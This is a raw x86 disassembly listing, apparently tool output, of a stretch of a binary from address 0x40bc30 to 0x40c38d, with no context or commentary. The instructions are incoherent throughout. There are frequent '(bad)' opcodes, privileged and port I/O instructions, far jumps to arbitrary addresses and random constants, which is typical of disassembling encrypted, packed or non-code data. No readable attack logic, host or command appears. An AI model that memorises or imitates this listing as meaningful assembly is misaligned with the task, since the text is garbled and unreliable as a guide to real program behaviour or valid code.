  40bc30:	outs   dx,DWORD PTR ds:[esi]
  40bc31:	fisttp QWORD PTR [eax+ebp*8]
  40bc34:	mov    esi,0x992ae687
  40bc39:	mov    cl,0xeb
  40bc3b:	into   
  40bc3c:	sbb    ebp,DWORD PTR [ecx+0x2fe400f6]
  40bc42:	push   edx
  40bc43:	and    bl,BYTE PTR [eax+esi*1+0x67]
  40bc47:	sahf   
  40bc48:	(bad)  
  40bc4a:	xchg   ebp,eax
  40bc4b:	xchg   esi,eax
  40bc4c:	sbb    al,al
  40bc4e:	(bad)  
  40bc4f:	out    0x1c,al
  40bc51:	fwait
  40bc52:	and    al,BYTE PTR [edi+0x6e]
  40bc55:	test   bh,bl
  40bc57:	sbb    ecx,DWORD PTR [ecx+0xe]
  40bc5a:	fwait
  40bc5b:	or     edx,DWORD PTR [eax+eax*8+0xe]
  40bc5f:	push   eax
  40bc60:	cmp    eax,0x4c3080a2
  40bc65:	popf   
  40bc66:	cld    
  40bc67:	fdivr  st(2),st
  40bc69:	sub    al,0xc3
  40bc6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc6c:	jns    0x40bcc8
  40bc6e:	mov    edi,0xc099d9d8
  40bc73:	add    eax,0x8169857
  40bc78:	adc    eax,edx
  40bc7a:	idiv   BYTE PTR [ebx+eiz*4-0x2a994a41]
  40bc81:	sbb    eax,0x52870fb3
  40bc86:	sub    BYTE PTR [edi-0xc],dh
  40bc89:	dec    ecx
  40bc8a:	test   dl,ah
  40bc8c:	and    DWORD PTR ds:0x81c0ca6b,eax
  40bc92:	mov    ds:0xe781bead,al
  40bc97:	sub    al,0x2e
  40bc99:	mov    dl,0xaa
  40bc9b:	pop    ss
  40bc9c:	jne    0x40bc53
  40bc9e:	mov    esi,0xb82ea976
  40bca3:	aad    0x4
  40bca5:	stos   DWORD PTR es:[edi],eax
  40bca6:	(bad)  
  40bca8:	sub    al,0xbe
  40bcaa:	(bad)  
  40bcab:	adc    esp,DWORD PTR [eax]
  40bcad:	mov    dh,0xc4
  40bcaf:	bound  ecx,QWORD PTR [ecx+0x10]
  40bcb2:	pop    esi
  40bcb3:	aad    0x9f
  40bcb5:	jnp    0x40bc6e
  40bcb7:	dec    ebp
  40bcb8:	cwde   
  40bcb9:	xor    ebx,eax
  40bcbb:	cmp    DWORD PTR [eax+0x1d],0xffffffa3
  40bcbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcc0:	xchg   edx,eax
  40bcc1:	jg     0x40bc52
  40bcc3:	fdivr  st,st(0)
  40bcc5:	mov    cl,0x6d
  40bcc7:	(bad)  
  40bcc8:	scas   eax,DWORD PTR es:[edi]
  40bcc9:	or     al,0x69
  40bccb:	mov    al,ds:0xc798e8ca
  40bcd0:	and    BYTE PTR [edi],0x23
  40bcd3:	jmp    0xca6b1fe3
  40bcd8:	scas   al,BYTE PTR es:[edi]
  40bcd9:	ret    
  40bcda:	(bad)  
  40bcdb:	cmp    DWORD PTR [bp+si],0xffffff92
  40bcdf:	inc    ebp
  40bce0:	mov    edi,0xa652a912
  40bce5:	nop
  40bce6:	adc    BYTE PTR ss:[ecx],cl
  40bce9:	call   0x50a605d0
  40bcee:	cwde   
  40bcef:	or     BYTE PTR [edi],0xa9
  40bcf2:	jmp    0x40bcb6
  40bcf4:	aad    0x2d
  40bcf6:	pop    ds
  40bcf7:	into   
  40bcf8:	and    eax,0xe10c4437
  40bcfd:	sbb    cl,BYTE PTR [ebp+0x784b6b8a]
  40bd03:	sub    bh,bh
  40bd05:	xor    al,0x16
  40bd07:	sbb    BYTE PTR [eax],ah
  40bd09:	mov    edi,0xfc8b25f4
  40bd0e:	or     DWORD PTR [esi+0x25],eax
  40bd11:	loopne 0x40bcef
  40bd13:	sub    esi,0x88ccbd23
  40bd19:	adc    al,0x43
  40bd1b:	or     cl,ch
  40bd1d:	and    al,BYTE PTR ds:0xa09a23ce
  40bd23:	jp     0x40bd3b
  40bd25:	jmp    0xa3f65be6
  40bd2a:	and    BYTE PTR [ebx],ch
  40bd2c:	cmp    al,bl
  40bd2e:	js     0x40bdad
  40bd30:	mov    dl,0x7a
  40bd32:	sbb    DWORD PTR [eax],eax
  40bd34:	aad    0x68
  40bd36:	std    
  40bd37:	ins    BYTE PTR es:[edi],dx
  40bd38:	jle    0x40bd7f
  40bd3a:	or     al,0xf8
  40bd3c:	mov    ah,0x5b
  40bd3e:	stos   BYTE PTR es:[edi],al
  40bd3f:	sar    BYTE PTR [edx],0xc0
  40bd42:	cmp    DWORD PTR [ebx],edx
  40bd44:	mov    al,0x8d
  40bd46:	(bad)  
  40bd47:	(bad)  
  40bd48:	jnp    0x40bd32
  40bd4a:	mov    edx,0x3454f56a
  40bd4f:	fsubr  QWORD PTR [ecx*1+0x1b8791ac]
  40bd56:	mov    edi,0x19d6fc82
  40bd5b:	dec    eax
  40bd5c:	(bad)
  40bd5f:	mov    bh,0x12
  40bd61:	add    ch,bh
  40bd63:	mov    cs,ebx
  40bd65:	out    dx,al
  40bd66:	pop    ds
  40bd67:	mov    eax,0xb6a04946
  40bd6c:	std    
  40bd6d:	jne    0x40bd38
  40bd6f:	mov    dl,0x1b
  40bd71:	xchg   esp,eax
  40bd72:	pop    ds
  40bd73:	ds je  0x40bd72
  40bd76:	mov    BYTE PTR [ecx-0x50],dl
  40bd79:	(bad)  [edi-0x31]
  40bd7c:	dec    DWORD PTR [edx]
  40bd7e:	mov    edi,0x1de81c90
  40bd83:	inc    ebx
  40bd84:	xor    eax,0xff13af4a
  40bd89:	cmp    eax,DWORD PTR [esi]
  40bd8b:	jae    0x40be05
  40bd8d:	xor    dl,ah
  40bd8f:	dec    esp
  40bd90:	outs   dx,BYTE PTR ds:[esi]
  40bd91:	dec    ecx
  40bd92:	sub    DWORD PTR [edx+0x6b8829e],ecx
  40bd98:	pop    ebx
  40bd99:	mov    DWORD PTR [ebp-0x3f],eax
  40bd9c:	and    al,0xb4
  40bd9e:	leave  
  40bd9f:	aas    
  40bda0:	ficom  DWORD PTR [edi]
  40bda2:	(bad)  [esi+0xd]
  40bda5:	dec    ebx
  40bda6:	inc    edi
  40bda7:	mov    ah,0x9f
  40bda9:	add    eax,0x6cfb2e49
  40bdae:	ins    DWORD PTR es:[edi],dx
  40bdaf:	pop    edx
  40bdb0:	and    al,0xe8
  40bdb2:	(bad)  
  40bdb3:	pop    edi
  40bdb4:	mov    DWORD PTR [ecx-0x7f0ee36d],ebx
  40bdba:	inc    esp
  40bdbb:	push   edx
  40bdbc:	pop    edx
  40bdbd:	mov    BYTE PTR [edi-0x28499342],bl
  40bdc3:	mov    dl,0xbe
  40bdc5:	mov    al,0x58
  40bdc7:	inc    esi
  40bdc8:	ja     0x40bd67
  40bdca:	push   ebx
  40bdcb:	jne    0x40be1a
  40bdcd:	sar    cl,1
  40bdcf:	xor    al,0x36
  40bdd1:	jne    0x40bd7f
  40bdd3:	mov    cl,0xf4
  40bdd5:	mov    BYTE PTR [ecx+0x9769dd7],cl
  40bddb:	inc    eax
  40bddc:	rcl    BYTE PTR [esi+0x16c5bbac],0x8e
  40bde3:	in     al,dx
  40bde4:	aam    0x2b
  40bde6:	dec    edi
  40bde7:	pop    esi
  40bde8:	push   esp
  40bde9:	adc    eax,0xcfef493b
  40bdee:	push   0x75
  40bdf0:	outs   dx,DWORD PTR ds:[esi]
  40bdf1:	pushf  
  40bdf2:	sbb    eax,DWORD PTR ds:0x14ad7c35
  40bdf8:	push   ebx
  40bdf9:	jg     0x40be1b
  40bdfb:	daa    
  40bdfc:	xchg   bh,cl
  40bdfe:	add    esp,edi
  40be00:	stos   BYTE PTR es:[edi],al
  40be01:	sub    BYTE PTR [ebx-0x560822f3],ch
  40be07:	mov    ebp,0xb3be82c8
  40be0c:	aaa    
  40be0d:	fisubr DWORD PTR [edi+0x49022bb2]
  40be13:	cmp    cl,BYTE PTR [ebx+edx*4+0x50]
  40be17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be18:	aaa    
  40be19:	sbb    ebx,ecx
  40be1b:	(bad)  
  40be1c:	mov    dl,0xee
  40be1e:	lds    ecx,FWORD PTR [eax+0x23949f26]
  40be24:	cwde   
  40be25:	(bad)  fs:[ebx]
  40be28:	daa    
  40be29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be2a:	jp     0x40bdbf
  40be2c:	bound  eax,QWORD PTR [esi-0x19]
  40be2f:	sub    eax,DWORD PTR [ecx-0x12fe2f07]
  40be35:	adc    dh,bl
  40be37:	push   ss
  40be38:	jns    0x40be35
  40be3a:	mov    WORD PTR [edx+0x51540177],ss
  40be40:	imul   ecx,DWORD PTR [edi-0xc33d37f],0xffffff87
  40be47:	icebp  
  40be48:	imul   BYTE PTR [ebp-0x8]
  40be4b:	xlat   BYTE PTR ds:[ebx]
  40be4c:	retf   
  40be4d:	jge    0x40be95
  40be4f:	fstenv [ebx+edi*4-0x2f]
  40be54:	jbe    0x40bdf6
  40be56:	push   ds
  40be57:	test   al,0x2a
  40be59:	sub    DWORD PTR [edi+0x30841aef],ebp
  40be5f:	cmp    BYTE PTR [ebp-0x1f],ah
  40be62:	or     al,0xda
  40be64:	lahf   
  40be65:	repnz fwait
  40be67:	inc    edx
  40be68:	mov    ebp,0x8f7ad593
  40be6d:	popf   
  40be6e:	sahf   
  40be6f:	mov    edx,0xb680b746
  40be74:	mov    ds:0x6301104,al
  40be79:	and    al,0x7f
  40be7b:	imul   edx,DWORD PTR [esi+0x19],0xffffff8e
  40be7f:	inc    eax
  40be80:	jg     0x40be0b
  40be82:	int3   
  40be83:	dec    esp
  40be84:	jg     0x40be0d
  40be86:	mov    ah,0xda
  40be88:	and    DWORD PTR [ebp-0x35],edi
  40be8b:	jp     0x40be1e
  40be8d:	push   cs
  40be8e:	enter  0x4e71,0x8a
  40be92:	add    eax,DWORD PTR [edx+0x69]
  40be95:	add    eax,0xd924b555
  40be9a:	and    BYTE PTR ds:0x4d45a5cd,bl
  40bea0:	sti    
  40bea1:	add    esi,DWORD PTR [ecx]
  40bea3:	fcmovu st,st(7)
  40bea5:	mov    al,0xe1
  40bea7:	sub    al,0x4f
  40bea9:	and    al,0x64
  40beab:	add    DWORD PTR [esp+eax*8-0x5d],esi
  40beaf:	aas    
  40beb0:	jno    0x40bea5
  40beb2:	(bad)  
  40beb3:	out    0x4c,eax
  40beb5:	push   eax
  40beb6:	jp     0x40be5e
  40beb8:	xor    eax,0x44e23350
  40bebd:	mov    ecx,0xa6ee8c0b
  40bec2:	das    
  40bec3:	sbb    eax,0xe5064f16
  40bec8:	sahf   
  40bec9:	xchg   esp,eax
  40beca:	leave  
  40becb:	fcomip st,st(1)
  40becd:	dec    edx
  40bece:	add    BYTE PTR [esi-0x76a58b3c],cl
  40bed4:	repz or bl,BYTE PTR [eax+0x3f9d37b5]
  40bedb:	sbb    eax,0x7ac0f69c
  40bee0:	mov    bh,0xa3
  40bee2:	sub    eax,0xb479c944
  40bee7:	retf   0x5790
  40beea:	jno    0x40befa
  40beec:	outs   dx,BYTE PTR ds:[esi]
  40beed:	pop    DWORD PTR [edx-0x78c892b3]
  40bef3:	jb     0x40bf01
  40bef5:	push   ebx
  40bef6:	in     eax,dx
  40bef7:	push   ds
  40bef8:	call   0x8204d150
  40befd:	pop    eax
  40befe:	sub    eax,0x32448e2b
  40bf03:	jp     0x40bf48
  40bf05:	mov    bl,0xeb
  40bf07:	fist   WORD PTR [ebx+0xbf92290]
  40bf0d:	dec    esi
  40bf0e:	ja     0x40bf17
  40bf10:	mov    al,0x8d
  40bf12:	scas   eax,DWORD PTR es:[di]
  40bf14:	xchg   edx,eax
  40bf15:	outs   dx,BYTE PTR ds:[esi]
  40bf16:	jmp    FWORD PTR [edx+0x21]
  40bf19:	js     0x40bf74
  40bf1b:	pop    ds
  40bf1c:	aam    0xd1
  40bf1e:	loopne 0x40bf3a
  40bf20:	fs xchg ebx,eax
  40bf22:	stos   BYTE PTR es:[edi],al
  40bf23:	inc    ecx
  40bf24:	sbb    eax,0x8d54bd11
  40bf29:	scas   eax,DWORD PTR es:[edi]
  40bf2a:	xlat   BYTE PTR ds:[ebx]
  40bf2b:	(bad)  
  40bf2d:	sbb    DWORD PTR [edx-0x3d6a55be],eax
  40bf33:	ja     0x40bed4
  40bf35:	inc    esi
  40bf36:	xchg   ecx,eax
  40bf37:	test   eax,0x35509a22
  40bf3c:	(bad)  
  40bf3d:	xor    BYTE PTR [edx+0x16],bl
  40bf40:	cmc    
  40bf41:	out    dx,al
  40bf42:	push   eax
  40bf43:	add    al,0xa
  40bf45:	icebp  
  40bf46:	sub    DWORD PTR [eax+0x45bce07b],0x9ad7a929
  40bf50:	rcr    BYTE PTR [edx+eax*4],cl
  40bf53:	aaa    
  40bf54:	jecxz  0x40bfbd
  40bf56:	and    edi,DWORD PTR ds:0x2afb7582
  40bf5c:	aaa    
  40bf5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf5e:	daa    
  40bf5f:	jo     0x40bf6b
  40bf61:	aad    0x14
  40bf63:	xchg   DWORD PTR [edx],edi
  40bf65:	jl     0x40bf26
  40bf67:	jne    0x40bf77
  40bf69:	(bad)  
  40bf6a:	sahf   
  40bf6b:	(bad)
  40bf6f:	pop    edx
  40bf70:	outs   dx,DWORD PTR ds:[si]
  40bf72:	mov    DWORD PTR [edi+0x6e],0x155244e2
  40bf79:	out    0x1c,al
  40bf7b:	lods   al,BYTE PTR ds:[esi]
  40bf7c:	popf   
  40bf7d:	mov    cl,0xfc
  40bf7f:	cwde   
  40bf80:	xor    BYTE PTR [ebx-0x643512b5],al
  40bf86:	arpl   WORD PTR [edx-0x4d],si
  40bf89:	mov    ecx,0xbbb65f6f
  40bf8e:	jo     0x40c007
  40bf90:	inc    eax
  40bf91:	push   ebx
  40bf92:	or     ch,BYTE PTR ds:0x76288fe3
  40bf98:	adc    ecx,edi
  40bf9a:	mov    dl,0x29
  40bf9c:	xchg   DWORD PTR [edx+0x3f9434a5],edi
  40bfa2:	cmp    al,0xe9
  40bfa4:	and    eax,0x1eac684a
  40bfa9:	xchg   edi,eax
  40bfaa:	shr    DWORD PTR [edi-0x56],0x3
  40bfae:	sub    DWORD PTR ds:0x8c5d6526,0xffffffa7
  40bfb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfb6:	jnp    0x40bf4d
  40bfb8:	fcom   QWORD PTR [ecx]
  40bfba:	retf   0xc98c
  40bfbd:	cld    
  40bfbe:	sbb    edi,eax
  40bfc0:	jg     0x40bf73
  40bfc2:	sti    
  40bfc3:	sbb    BYTE PTR [esi],dh
  40bfc5:	mov    bl,0xd7
  40bfc7:	data16 jns 0x40c021
  40bfca:	sub    eax,0x86813cda
  40bfcf:	neg    BYTE PTR [eax+0x6c]
  40bfd2:	aaa    
  40bfd3:	repz or eax,0xeeacb0da
  40bfd9:	mov    WORD PTR [ebp+0x69],?
  40bfdc:	adc    al,0xc7
  40bfde:	ror    edi,1
  40bfe0:	push   ds
  40bfe1:	mov    bl,0x75
  40bfe3:	arpl   WORD PTR [ebx],sp
  40bfe5:	jae    0x40bfcc
  40bfe7:	xor    al,0x45
  40bfe9:	adc    DWORD PTR [ebx-0x49596cc2],0x2cc846ab
  40bff3:	mov    ebp,0xac8f93aa
  40bff8:	and    cl,BYTE PTR [edi+0x20]
  40bffb:	xor    ebx,ebp
  40bffd:	sub    DWORD PTR [edi-0x1f],esp
  40c000:	call   0x53f4:0xcdffe24f
  40c007:	mov    DWORD PTR [edx-0x4f7e16f1],esi
  40c00d:	and    al,0xfe
  40c00f:	mov    esp,0x8e99727c
  40c014:	ins    DWORD PTR es:[edi],dx
  40c015:	mov    edi,0x198fe96d
  40c01a:	mov    ch,0x8c
  40c01c:	push   es
  40c01d:	mov    WORD PTR [ebx-0x41],cs
  40c020:	xchg   ebx,eax
  40c021:	clc    
  40c022:	sbb    eax,0x315a5798
  40c027:	mov    al,0x19
  40c029:	out    0xb9,al
  40c02b:	sbb    eax,0x33f84d8b
  40c030:	mov    BYTE PTR ds:0x327298,0x89
  40c037:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  40c03d:	clc    
  40c03e:	jmp    0x40c549
  40c043:	retf   0xc63f
  40c046:	retf   
  40c047:	leave  
  40c048:	leave  
  40c049:	leave  
  40c04a:	cmp    eax,0xf50d3f64
  40c04f:	jae    0x40c0a5
  40c051:	inc    eax
  40c052:	je     0x40bfe8
  40c054:	mov    eax,ds:0x7c6a7878
  40c059:	js     0x40c0d3
  40c05b:	cmp    DWORD PTR [ebx-0x6cccbb7b],edx
  40c061:	push   ss
  40c062:	mov    ebx,0x99e1c09a
  40c067:	inc    edi
  40c068:	and    bh,BYTE PTR [edi+0x49ead0f9]
  40c06e:	bound  ebx,QWORD PTR [esi+0x14]
  40c071:	dec    ebx
  40c072:	js     0x40c06e
  40c074:	fwait
  40c075:	push   edx
  40c076:	lds    ecx,FWORD PTR [esi+0x76]
  40c079:	das    
  40c07a:	adc    bl,ch
  40c07c:	repnz xlat BYTE PTR ds:[ebx]
  40c07e:	clc    
  40c07f:	out    0x4a,al
  40c081:	es dec esi
  40c083:	xchg   dx,ax
  40c085:	mov    edx,0x629984e6
  40c08a:	into   
  40c08b:	mov    edi,?
  40c08d:	dec    ecx
  40c08e:	mov    ch,0x6d
  40c090:	mov    BYTE PTR [edi+0x21],dl
  40c093:	or     al,0x86
  40c095:	int3   
  40c096:	ins    DWORD PTR es:[edi],dx
  40c097:	in     eax,0x63
  40c099:	and    eax,0x1f552fb
  40c09e:	jbe    0x40c0c2
  40c0a0:	xchg   bl,bl
  40c0a2:	mov    ebp,0x2754485
  40c0a7:	or     eax,0xce613959
  40c0ac:	sbb    edi,ecx
  40c0ae:	cmp    dh,ah
  40c0b0:	das    
  40c0b1:	or     esi,edx
  40c0b3:	lods   eax,DWORD PTR ds:[si]
  40c0b5:	sub    esp,ebp
  40c0b7:	retf   0x64ec
  40c0ba:	js     0x40c0b8
  40c0bc:	add    al,0xf3
  40c0be:	add    BYTE PTR [edx-0x32],ah
  40c0c1:	sbb    al,BYTE PTR [edx-0x41]
  40c0c4:	mov    ebx,0xd32db9cc
  40c0c9:	pop    eax
  40c0ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0cb:	mov    al,0x8b
  40c0cd:	mov    dl,0x67
  40c0cf:	dec    esi
  40c0d0:	lock mov esp,DWORD PTR [eax-0x220bfd24]
  40c0d7:	out    0xc5,al
  40c0d9:	outs   dx,DWORD PTR ds:[esi]
  40c0da:	jbe    0x40c0ed
  40c0dc:	aaa    
  40c0dd:	std    
  40c0de:	nop
  40c0df:	sti    
  40c0e0:	aaa    
  40c0e1:	popf   
  40c0e2:	pop    edx
  40c0e3:	sbb    DWORD PTR [ebp+0x27f429d5],eax
  40c0e9:	les    edx,FWORD PTR [edx-0x1f0f226a]
  40c0ef:	mov    dh,0xcb
  40c0f1:	(bad)  
  40c0f2:	mov    cl,0x50
  40c0f4:	sbb    BYTE PTR [ebp+0x18c4914a],ah
  40c0fa:	mov    ebp,DWORD PTR [eax]
  40c0fc:	fisttp DWORD PTR ds:0x8360b7b5
  40c102:	jns    0x40c168
  40c104:	nop
  40c105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c106:	cmc    
  40c107:	push   ebp
  40c108:	xchg   ebx,eax
  40c109:	lahf   
  40c10a:	inc    ebp
  40c10b:	ds mov dl,0xf
  40c10e:	loope  0x40c0d6
  40c110:	sub    DWORD PTR [ecx],0x8d9b5a16
  40c116:	inc    eax
  40c117:	xchg   ebp,eax
  40c118:	imul   esp,DWORD PTR [ecx],0x7be9339c
  40c11e:	mov    eax,0xa94caac8
  40c123:	call   FWORD PTR [ebp+0x6fa0a4b5]
  40c129:	fs enter 0xcdf4,0x9c
  40c12e:	mov    edi,DWORD PTR [ebx]
  40c130:	jns    0x40c13e
  40c132:	mov    ebx,0xb22c56c7
  40c137:	jne    0x40c14f
  40c139:	jbe    0x40c0eb
  40c13b:	push   cs
  40c13c:	push   edx
  40c13d:	clc    
  40c13e:	push   ebp
  40c13f:	fldenv [ebx+0xa]
  40c142:	dec    ebp
  40c143:	in     al,dx
  40c144:	adc    DWORD PTR ds:0xb940b2f0,ebp
  40c14a:	aas    
  40c14b:	(bad)  
  40c14d:	loope  0x40c16a
  40c14f:	fild   DWORD PTR [edi+0x2c]
  40c152:	and    eax,0xf633c52d
  40c157:	pop    edx
  40c158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c159:	and    al,0x67
  40c15b:	sbb    DWORD PTR [esi+0x23],ebp
  40c15e:	push   ecx
  40c15f:	popf   
  40c160:	adc    ebp,ebp
  40c162:	sbb    al,0xe8
  40c164:	shl    BYTE PTR [ebx-0x6e],1
  40c167:	xchg   ebp,eax
  40c168:	jb     0x40c10d
  40c16a:	xor    ch,bh
  40c16c:	(bad)  
  40c16d:	outs   dx,DWORD PTR gs:[si]
  40c170:	push   eax
  40c171:	(bad)  
  40c172:	lock adc ebp,DWORD PTR [ecx+0x7fe1b58]
  40c179:	les    edx,FWORD PTR [ebp+0xe]
  40c17c:	cmc    
  40c17d:	and    DWORD PTR [edi+ebx*8],ecx
  40c180:	rol    BYTE PTR [ecx+0x1],0x88
  40c184:	repz jnp 0x40c141
  40c187:	jno    0x40c1fc
  40c189:	jb     0x40c19b
  40c18b:	in     al,0xb7
  40c18d:	cmp    eax,0x22980f7c
  40c192:	mov    DWORD PTR [esi],edi
  40c194:	stos   BYTE PTR es:[edi],al
  40c195:	clts   
  40c197:	and    BYTE PTR [eax],cl
  40c199:	mov    edx,0x2b6ea84c
  40c19e:	dec    ebp
  40c19f:	push   es
  40c1a0:	inc    ebp
  40c1a1:	stos   BYTE PTR es:[edi],al
  40c1a2:	xor    edx,edi
  40c1a4:	push   edi
  40c1a5:	call   0xf585a889
  40c1aa:	pusha  
  40c1ab:	into   
  40c1ac:	ins    DWORD PTR es:[edi],dx
  40c1ad:	loop   0x40c19a
  40c1af:	loope  0x40c157
  40c1b1:	sub    al,0xb9
  40c1b3:	aam    0x2
  40c1b5:	aad    0x61
  40c1b7:	cmc    
  40c1b8:	cmc    
  40c1b9:	and    ebp,esp
  40c1bb:	sub    DWORD PTR [edx],esi
  40c1bd:	add    esp,DWORD PTR [ebp-0x34096a7f]
  40c1c3:	adc    DWORD PTR [ebx+0x7334ae73],edx
  40c1c9:	pushf  
  40c1ca:	(bad)  
  40c1cb:	and    al,0xb3
  40c1cd:	sbb    DWORD PTR [ecx+ecx*8-0x19],edx
  40c1d1:	out    dx,eax
  40c1d2:	repz mov al,ds:0xaea759e
  40c1d8:	xchg   ecx,eax
  40c1d9:	arpl   WORD PTR [ebx],si
  40c1db:	mov    al,BYTE PTR [edi]
  40c1dd:	mov    al,fs:0xec9599ff
  40c1e3:	or     al,0x29
  40c1e5:	add    dh,al
  40c1e7:	xor    cl,dh
  40c1e9:	push   eax
  40c1ea:	fucomi st,st(3)
  40c1ec:	mov    ds:0xd1118b6f,al
  40c1f1:	pop    esp
  40c1f2:	retf   0x2c11
  40c1f5:	sub    cl,BYTE PTR [esi+0x6d]
  40c1f8:	xchg   DWORD PTR ds:0x245aa43e,ebx
  40c1fe:	(bad)  
  40c1ff:	stos   DWORD PTR es:[edi],eax
  40c200:	push   ss
  40c201:	cmp    BYTE PTR [ebp-0x521341d],bh
  40c207:	mov    gs:0x815740a2,eax
  40c20d:	jo     0x40c1e6
  40c20f:	push   esi
  40c210:	mov    WORD PTR [ecx-0x44],ds
  40c213:	inc    ebx
  40c214:	add    BYTE PTR [edi-0x4b],ch
  40c217:	loopne 0x40c288
  40c219:	retf   0x4879
  40c21c:	pop    eax
  40c21d:	pop    edi
  40c21e:	sbb    DWORD PTR [ebx+0x26e2e74],ebx
  40c224:	adc    eax,0xd0e403ea
  40c229:	xor    al,0xc2
  40c22b:	mul    DWORD PTR [ebp+0x7d]
  40c22e:	fidivr DWORD PTR [ecx-0x18]
  40c231:	(bad)  
  40c232:	adc    edi,esp
  40c234:	data16 cmc 
  40c236:	call   0x2eab:0x84014d84
  40c23d:	shr    BYTE PTR [ebp-0x49d2341a],1
  40c243:	and    edx,eax
  40c245:	push   eax
  40c246:	rol    ebx,0x5a
  40c249:	fs inc ebx
  40c24b:	sbb    edi,DWORD PTR [eax-0x25]
  40c24e:	les    ebx,FWORD PTR [esi+0x42cb909]
  40c254:	cmp    esp,DWORD PTR [ebp-0x1]
  40c257:	pop    ss
  40c258:	jle    0x40c2af
  40c25a:	jmp    0xab2b:0xaa02215d
  40c261:	xchg   edi,eax
  40c262:	mov    ah,0x91
  40c264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c266:	fdiv   st(2),st
  40c268:	push   ebx
  40c269:	hlt    
  40c26a:	and    al,0xb3
  40c26c:	adc    DWORD PTR [esp+eiz*4-0x3],edx
  40c270:	dec    esi
  40c271:	and    DWORD PTR [ecx],esp
  40c273:	or     DWORD PTR [edx+0x86fcd85],ebx
  40c279:	(bad)  
  40c27a:	leave  
  40c27b:	pop    eax
  40c27c:	aam    0x4f
  40c27e:	test   al,0x5b
  40c280:	jg     0x40c2ca
  40c282:	ret    0xaf
  40c285:	out    dx,al
  40c286:	push   edi
  40c287:	mov    ch,0x55
  40c289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c28a:	xchg   ebx,eax
  40c28b:	xor    eax,0x8d6a4894
  40c290:	rcr    DWORD PTR [esi],cl
  40c292:	cmp    eax,DWORD PTR [edx+0xc9615ce]
  40c298:	sub    ah,BYTE PTR [esi+0x64e7c4a4]
  40c29e:	sbb    BYTE PTR [ebp-0x404de534],ch
  40c2a4:	icebp  
  40c2a5:	retf   
  40c2a6:	sar    bl,1
  40c2a8:	jo     0x40c26d
  40c2aa:	ficom  WORD PTR [ecx-0x78]
  40c2ad:	adc    ebp,DWORD PTR [eax-0xc61a233]
  40c2b3:	neg    dh
  40c2b5:	xor    BYTE PTR [esi-0x1f],bh
  40c2b8:	imul   eax,eax,0x584d2ab4
  40c2be:	inc    edx
  40c2bf:	inc    ebp
  40c2c0:	add    ah,ch
  40c2c2:	push   ss
  40c2c3:	loope  0x40c2d5
  40c2c5:	push   es
  40c2c6:	inc    edi
  40c2c7:	les    edx,FWORD PTR [ebx+0x0]
  40c2ca:	and    al,0x5a
  40c2cc:	inc    ebp
  40c2cd:	pusha  
  40c2ce:	int3   
  40c2cf:	sub    ecx,DWORD PTR [ebp+0x6c]
  40c2d2:	iret   
  40c2d3:	div    BYTE PTR [eax+ebp*8]
  40c2d6:	mov    bl,BYTE PTR [edi+0x65]
  40c2d9:	retf   
  40c2da:	js     0x40c2bd
  40c2dc:	out    0x6b,al
  40c2de:	jb     0x40c2e3
  40c2e0:	lods   eax,DWORD PTR ds:[esi]
  40c2e1:	enter  0x1549,0xe7
  40c2e5:	push   ss
  40c2e6:	mov    DWORD PTR [edi+0x20c2b2de],ebp
  40c2ec:	adc    al,BYTE PTR [ecx]
  40c2ee:	pop    es
  40c2ef:	or     dh,ah
  40c2f1:	cmp    esp,DWORD PTR ds:0xefe3c90f
  40c2f7:	mov    bh,0x11
  40c2f9:	pop    DWORD PTR [ebp-0x429a2ffa]
  40c2ff:	mov    ebx,0x28e04b3
  40c304:	jmp    0xd79f:0xa8d25a5a
  40c30b:	(bad)  
  40c30c:	pop    ebp
  40c30d:	mov    ch,0xbb
  40c30f:	and    eax,0x36e1a3b3
  40c314:	scas   al,BYTE PTR es:[edi]
  40c315:	dec    ecx
  40c316:	clc    
  40c317:	sub    edx,DWORD PTR [ebx+ecx*4+0x534b2628]
  40c31e:	dec    ebx
  40c31f:	not    dl
  40c321:	cmp    cl,BYTE PTR [bp+0x5edc]
  40c326:	es xchg edx,eax
  40c328:	pop    ebp
  40c329:	or     eax,0x79c711e3
  40c32e:	mov    cl,0xc1
  40c330:	aam    0x55
  40c332:	xor    dl,BYTE PTR [edi]
  40c334:	fs cmc 
  40c336:	lahf   
  40c337:	cmp    BYTE PTR [ebx],cl
  40c339:	dec    edx
  40c33a:	sub    al,BYTE PTR [esi+0x59b277ae]
  40c340:	aas    
  40c341:	mov    ecx,DWORD PTR [ecx+esi*8+0x0]
  40c345:	sahf   
  40c346:	push   ss
  40c347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c348:	pop    edx
  40c349:	pusha  
  40c34a:	sbb    al,0xc6
  40c34c:	rcl    esi,0xe
  40c34f:	jge    0x40c372
  40c351:	nop
  40c352:	jecxz  0x40c365
  40c354:	aam    0x1b
  40c356:	lods   al,BYTE PTR ds:[esi]
  40c357:	inc    ebp
  40c358:	(bad)  
  40c359:	loopne 0x40c345
  40c35b:	pusha  
  40c35c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c35d:	add    DWORD PTR [ebx],ebp
  40c35f:	and    al,0xb2
  40c361:	xchg   esp,eax
  40c362:	int3   
  40c363:	xlat   BYTE PTR ds:[ebx]
  40c364:	sub    bh,dh
  40c366:	or     eax,0xa16f19ee
  40c36b:	and    eax,0x6f422ae4
  40c370:	setg   BYTE PTR [esi]
  40c373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c374:	sub    eax,0x9bbc39c8
  40c379:	lock or BYTE PTR [esi+0x5],bl
  40c37d:	sub    al,0x4c
  40c37f:	mov    BYTE PTR [ebp+0x16750f03],ch
  40c385:	adc    al,bh
  40c387:	(bad)  
  40c388:	cmp    al,0xf6
  40c38a:	and    bh,dh
  40c38c:	inc    esi
  40c38d:	jae    0x40c358
